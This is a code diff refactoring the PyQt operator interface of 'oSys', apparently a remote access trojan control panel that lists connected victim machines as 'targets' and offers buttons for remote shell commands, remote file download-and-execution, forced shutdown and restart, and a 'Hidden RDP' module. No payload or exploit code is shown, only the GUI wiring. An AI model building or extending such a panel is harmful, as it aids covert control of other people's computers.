@@ -7,11 +7,11 @@ from socket import error as socket_error
 
 
 class Window(QWidget):
-    def __init__(self, server):
+    def __init__(self):
+        """ Initiates the main GUI window. """
         super().__init__()
-        self.setWindowTitle("oSys - Panel Dashboard | Made by Asaf and Rohy | Version: 0.4a")
+        self.setWindowTitle("oSys - Panel Dashboard | Made by Asaf and Rohy | Version: 0.5")
         self.resize(530, 350)
-        self.server = server
 
         # Create a top-level layout
         layout = QVBoxLayout()
@@ -73,7 +73,7 @@ class Window(QWidget):
                 conn = config.client_list[i]['data']['socket']
                 conn.send(''.encode())
             except socket_error:
-                config.client_list.pop(i)
+                config.delete_client(i)
 
         # Updates the table data
         self.table.clearContents()
@@ -84,11 +84,15 @@ class Window(QWidget):
             self.table.setItem(i, 2, QTableWidgetItem(config.client_list[i]['data']['name']))
             self.table.setItem(i, 3, QTableWidgetItem(config.client_list[i]['ip']))
             self.table.setItem(i, 4, QTableWidgetItem(config.client_list[i]['data']['os']))
-            self.table.setCellWidget(i, 5, QPushButton("Menu {}".format(i + 1), clicked=(lambda i: lambda: Menu(self.server, [i]).show())(i)))
+            self.table.setCellWidget(i, 5, QPushButton("Menu {}".format(i + 1), clicked=(lambda i: lambda: Menu([i]).show())(i)))
 
     # --- Private functions ---
     def _on_checkbox_click(self, target):
-        # Activated upon checkbox being clicked - Sets value of gaagaehaseh
+        """
+        This function is being activated upon checkbox click.
+        This function sets the value adds the client to the targets list if it's ticked. Else, it removes it.
+        :parm target: Number of client
+        """
         if self.table.cellWidget(target, 0).isChecked() is True:
             config.targets.append(target)
         else:
@@ -111,18 +115,18 @@ class Window(QWidget):
         """ This function creates a menu panel for all of the selected targets. If no target was selected, a error message would pop up"""
         for i in range(self.table.rowCount()):
             if self.table.cellWidget(i, 0).isChecked():
-                Menu(self.server, config.targets).show()
+                Menu(config.targets).show()
                 return
         self.no_selected_users_error_ui()
 
 
 class Menu(QWidget):
-    def __init__(self, server, client_list):
+    def __init__(self, client_list):
+        """ Initiates the control panel """
         super().__init__()
         title = 'oSys - Menu ' + (str(client_list[0] + 1) if len(client_list) < 2 else 'for selected users')
         self.setWindowTitle(title)
         self.resize(530, 350)
-        self.server = server
         config.targets = client_list
 
         # Create a top-level layout
@@ -178,8 +182,9 @@ class Menu(QWidget):
 
         # Creates buttons
         button_layout = QHBoxLayout()
+
         run_command_button = QPushButton('Run Command', clicked=lambda: self.send_shell_command(command_input.text().strip()))
-        clear_console_button = QPushButton('Clear', clicked=lambda: self.shell_output.clear())
+        clear_console_button = QPushButton('Clear', clicked=self.shell_output.clear)
 
         # Adds text objects to layout
         layout.addWidget(command_input, 3)
@@ -234,43 +239,59 @@ class Menu(QWidget):
         return dashboard_tab
 
     # --- Button Functions ---
-    def upload_file_clicked(self):
-        Execute.upload(self.server, self.file_url_textbox.text())
-        self.file_url_textbox.clear()
+    @staticmethod
+    def restart_clicked():
+        """ Initiates the restart module. """
+        Power.restart()
 
-    def restart_clicked(self):
-        Power.restart(self.server)
+    @staticmethod
+    def shutdown_clicked():
+        """ Initiates the power module. """
+        Power.shutdown()
 
-    def shutdown_clicked(self):
-        Power.shutdown(self.server)
-
-    def screenshot_clicked(self):
+    @staticmethod
+    def screenshot_clicked():
+        """ Initiates the screenshot module. """
         print("screenshot clicked")  # WIP AHAHAHAHAHAAHAHH
 
-    def install_ssh_server_clicked(self):
+    @staticmethod
+    def install_ssh_server_clicked():
+        """ Initiates the SSH Server installer in the hrdp module. """
         HRDP.install_ssh_server()
 
-    def uninstall_ssh_server_clicked(self):
+    @staticmethod
+    def uninstall_ssh_server_clicked():
+        """ Initiates the SSH Server uninstaller in the hrdp module. """
         HRDP.uninstall_ssh_server()
 
-    def start_hrdp_clicked(self):
-        HRDP.start(self.server)
+    @staticmethod
+    def start_hrdp_clicked():
+        """ Initiates the Hidden RDP in the hrdp module. """
+        HRDP.start()
 
-    def stop_hrdp_clicked(self):
+    @staticmethod
+    def stop_hrdp_clicked():
+        """ Stops the SSH Server in the hrdp module. """
         HRDP.stop()
+
+    def upload_file_clicked(self):
+        """ Initiates the remote file download&execution module. """
+        Execute.upload(self.file_url_textbox.text())
+        self.file_url_textbox.clear()
 
     def send_shell_command(self, command):
         """
         This function would send a shell command to the client and show the response in the self.shell_output text object
         :param command: cmd command to operate
         """
-        output = Shell.shell(self.server, command)
+        output = Shell.shell(command)
         self.shell_output.clear()
         self.shell_output.insertPlainText(output)
 
 
-def start(server):
+def start():
+    """ Starts the GUI. """
     app = QApplication(sys.argv)
-    win = Window(server)
+    win = Window()
     win.show()
     sys.exit(app.exec())
